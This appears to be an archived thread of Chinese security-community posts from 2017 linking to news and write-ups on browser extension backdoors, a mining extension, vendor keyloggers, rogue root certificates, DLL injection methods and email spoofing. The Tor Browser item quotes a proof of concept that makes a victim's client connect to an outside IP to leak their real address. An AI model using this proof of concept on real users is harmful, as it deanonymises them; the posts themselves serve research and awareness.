<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 看来以后要多注意这些莫名请求了😄


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-10:


__#经验#__

手工逆 Chrome 扩展后门的一些思路

基于昨晚发的那个 Chrome 扩展后门事件，刚刚写了篇小文，供大家参考：


[手工逆 Chrome 扩展后门的一些思路](http://mp.weixin.qq.com/s/h7m7-luE4nW_utaZhUrKEA)

 

玩进去的，欢迎交流。

<img src="https://images.xiaomiquan.com/FikpJYlbDmOLoYuCT6f432ejN6Yp?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o5OqM2gGj4WByaaxNq5FhrTA6Co=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fjjd5-5HgUBmutFJUuy4MkZn9axE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7ZVNRvAMSnNfcM9VeL0EJjBH7l4=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-20:


__#后门#__

第一个 Chrome 挖矿扩展被发现

扩展是 SafeBrowse，14 万安装量...

打着“安全”旗号，利用用户电脑资源偷偷挖矿。细节见：


[First ever crypto-mining Chrome extension discover...](https://hotforsecurity.bitdefender.com/blog/first-ever-crypto-mining-chrome-extension-discovered-18992.html)

 

又是 Chrome 扩展的安全问题，Chrome 对扩展的安全审计得更严格了。

<img src="https://images.xiaomiquan.com/FmGrpCoWrNkErotTtUbOGhh8yCrI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:RN7nkeZfNDTQTTF2jHRpnfus5uU=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fq7UDlAIpRlaLrD0GvbewRGxqa3h?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Mjk-sIGWJ17fnIjDKjYoNLEDi60=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 早上看到一个扩展，当时还不知道为什么会有人去研发这个，现在知道了：

[GitHub - xd4rker/MinerBlock: A web extension to bl...](https://github.com/xd4rker/MinerBlock)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: MinerBlock 源码很简单，可以阻止基于浏览器的挖坑，但是如果挖矿平台是其他的就得自己去添加了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-27:


__#漏洞#__

  Linux TBB SFTP URI 会导致 Tor 浏览器泄露真实 IP

这个漏洞技巧挺有趣的，值得参考，虽然应该修复了。


[#253429 Linux TBB SFTP URI allows local IP disclos...](https://hackerone.com/reports/253429)

 

过程：

Browsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.
Tested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz

POC:
Navigate to sftp://104.131.180.179:80/index.php

After ~1 minute check http://104.131.180.179/ip,txt for your IP address

It appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected.

Excerpt from apache logs:
apache2: [core:error] [pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1

Not surprisingly, the client can also be directed to local resources as well.

...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ga专用。哈哈


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-19:

关于最新 Firefox 扩展不兼容，我的一些看法，同步过来给大家也看看：


[为什么最新版 Firefox 浏览器禁止了 Hackbar 渗透测试插件的使用？ - 知乎](https://www.zhihu.com/question/68338297/answer/262162461)



话说，新版 Firefox 确实帅，见：


[适用于 Mac、PC 以及 Linux 的全新、快速浏览器 | Firefox](https://www.mozilla.org/zh-CN/firefox/)

 

宣传页有句话是：“快而极简，与 Firefox Quantum 相比 Chrome 显得过时。”

期待那些优秀安全扩展的作者可以更新，跟上 Firefox 的大变化，至少 NoScript 新扩展很快会发布。

浏览器安全研究者们又有新生态可以去突破;-)


<img src="https://file.xiaomiquan.com/1be/dd/bedd8e48aaede7e6fc807ec5fc4f8c30a30a12f642ad61e2cabd25dc507c1b3b.jpg" width="50%" height="50%" align="middle"/>

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-12-01:


__#工具#__

  Hackbar 的新版本来了！


[Hackbar for Firefox 57  – Add-ons for Firefox](https://addons.mozilla.org/en-US/firefox/addon/hackbar-for-firefox-57/)



前些天还说 Firefox 57 发布，导致很多扩展不兼容，那，Hackbar 新版来了。

可惜这种新型扩展（Web Extension）比起老的（XUL）来说，体验确实普遍差了不少。


<img src="https://file.xiaomiquan.com/131/3d/313d3493b7ad637015db04bf6c0bc184e901f29774853027c2c67e3c6691b326.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 融入到 F12 里了，这个好

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-22:


__#工具#__

  NoScript 10 发布...

确实是纯 Web 扩展了，这是向 Chrome 看齐，但是可惜了，NoScript 已经不是当年的 NoScript。毕竟 Firefox 57 版本也不是当年的 Firefox 了。

具体差异技术细节回头再说。


<img src="https://file.xiaomiquan.com/178/9e/789e1e06d23a13d303987a0f8b1be48b4692cde0a9aed22021147632469ca109.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/19b/82/9b821f71d1ee238c87ccb4a277ad465431d08e9573ecc23e6b1b78be85da6c32.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/141/00/41004557a8e04b32c9c1f54bd012afe339cb60d6dc09099be1d01b5e2323d63b.jpg" width="50%" height="50%" align="middle"/>


---

## 跳转漏洞



<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-10-27:

跳转漏洞测试，payload不错和测试方法不错，来一批域名群测一下，刷爆Src ：）


[GitHub - cujanovic/Open-Redirect-Payloads: Open Re...](https://github.com/cujanovic/Open-Redirect-Payloads)



[GitHub - ak1t4/open-redirect-scanner: open redirec...](https://github.com/ak1t4/open-redirect-scanner)


---

## 证书

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-11-03:

某些Savitech驱动程序软件包会将根CA证书安装到Windows信任的根证书存储库中。
但幸运的目前私钥还未泄漏，
危害：如果私钥泄漏，攻击者都可以使用这个根证书来生成对任意网站都有效的证书，还可以篡改用户的流量，嗅探所有TLS加密的流量了，

[Vulnerability Note VU#446847 - Savitech USB audio ...](https://www.kb.cert.org/vuls/id/446847)


比较出名的安装CA证书事件有：戴尔eDellRoot，联想superfish！



---

## 键盘-触摸板

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-12-09:

__#威胁情报#__

HP键盘驱动被曝存在键盘纪录，其实今年5月的时HP音频驱动就被曝过存在键盘纪录

用带有合法签名的软件来进行攻击，简直爽歪歪。

[HP keylogger – Bytes – ZwClose on bytes](https://zwclose.github.io/HP-keylogger/)

[Keylogger Found In HP Audio Driver](http://www.tomshardware.com/news/hp-keylogger-audio-driver-modzero,34403.html)


<img src="https://images.zsxq.com/FjaPdGbEoBZaF-9I7ndp4w44Rbin?imageMogr2/auto-orient/thumbnail/320x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PapAXST13DNoiaOph6kFc0ro84I=" width="50%" height="50%" align="middle"/>




...

<img src="https://file.zsxq.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__:   买了个edup网卡，原装的驱动u盘里还有后门dll……

...

---

<img src="https://file.zsxq.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-12-11:

联想电脑 触摸板服务模块代码执行 这也很通杀啊（后门？）

思考一下 类似的 说不定能通杀一个品牌 甚至多个品牌

[Code Execution via Insecure Synaptics Section Obje...](http://riscy.business/2017/12/lenovos-unsecured-objects/)

---

## CPU



<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-11-28:

预告：Intel CPU ME 引擎漏洞利用演示
blackhat欧洲专场 


[How to Hack a Turned-Off Computer, or Running Unsi...](https://www.blackhat.com/eu-17/briefings/schedule/#how-to-hack-a-turned-off-computer-or-running-unsigned-code-in-intel-management-engine-8668)




<img src="https://file.xiaomiquan.com/157/38/57385f0e4502a3827c566affd98373912f6eaf6b7eeaaa2755eb319146f8221c.jpg" width="50%" height="50%" align="middle"/>


---

## DLL 注入



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-30:


__#姿势#__

 DLL 注入的各种姿势

这篇文章介绍了 DLL 注入的各种姿势，还开源了相关工具（C++源码）。

+ DLL injection via CreateRemoteThread()
+ DLL injection via NtCreateThreadEx()
+ DLL injection via QueueUserAPC()
+ DLL injection via SetWindowsHookEx()
+ DLL injection via RtlCreateUserThread()
+ DLL injection via Code Cave SetThreadContext()
+ Reflective DLL injection


[Inject All the Things - Shut Up and Hack](http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/)



[GitHub - fdiskyou/injectAllTheThings: Seven differ...](https://github.com/fdiskyou/injectAllTheThings/)



对于懂渗透且玩 C++ 的，这篇文章和这份代码非常值得参考。


<img src="https://file.xiaomiquan.com/1ef/29/ef29b3ab6b408adaf3a45e87b30b00f08b77136b2bf4dfce5f96e1c5b8520219.png" width="50%" height="50%" align="middle"/>


---



## Mail

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-12-06:


__#威胁情报#__

 最新的邮件欺骗漏洞，漏洞命名为Mailsploit，
   
可以绕过DMARC（DKIM / SPF）或垃圾邮件过滤器
   
影响超过30个电子邮件应用程序容易受到攻击，包括流行的客户端，如Microsoft Outlook 2016，Apple Mail，Yahoo!

[Mailsploit](https://www.mailsploit.com/index)


---